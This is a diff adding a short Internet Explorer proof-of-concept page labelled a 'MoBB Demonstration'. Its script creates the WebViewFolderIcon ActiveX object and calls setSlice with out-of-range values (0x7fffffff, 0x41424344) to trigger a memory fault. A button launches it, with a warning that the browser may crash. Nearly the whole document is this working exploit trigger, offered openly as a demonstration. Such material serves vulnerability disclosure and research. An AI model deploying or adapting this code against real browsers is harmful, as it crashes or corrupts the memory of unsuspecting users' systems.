@@ -1,0 +1,10 @@
+// MoBB Demonstration
+function Demo() {
+	var a = new ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1');
+	a.setSlice(0x7fffffff, 0, 0x41424344, 0);
+}
+
+</script>
+
+Clicking the button below may crash your browser!<br><br>
+<input type='button' onClick='Demo()' value='Start Demo!'>
